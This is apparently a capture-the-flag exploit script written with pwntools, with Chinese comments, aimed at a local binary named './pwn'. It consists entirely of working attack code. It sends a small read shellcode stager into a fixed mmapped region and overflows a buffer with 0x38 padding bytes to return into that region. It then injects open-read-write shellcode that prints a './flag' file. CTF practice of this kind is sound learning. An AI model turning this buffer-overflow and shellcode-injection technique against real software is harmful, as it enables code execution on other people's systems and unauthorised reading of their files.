from pwn import *

context(log_level='debug', arch='amd64', os='linux')

r = process('./pwn')
gdb.attach(r, 'b*$rebase(0x0000A87)\nc')

mmap = 0x233000

r.send(asm(shellcraft.read(0, mmap + 21, 0x800)))
# print(len(asm(shellcraft.read(0, mmap + 21, 0x800)))) # 长度 21, 上面这些shellcode 长度为21, 最后发送的内容直接写入 21之后的地址, 写入后相当于顺序执行了

orw_payload = shellcraft.open('./flag')
orw_payload += shellcraft.read(3, mmap + 0x850, 0x50)
orw_payload += shellcraft.write(1, mmap + 0x850, 0x50)
# print(len(orw_payload))

r.sendline(b'a' * 0x38 + p64(mmap))
r.sendline(asm(orw_payload))
r.interactive()
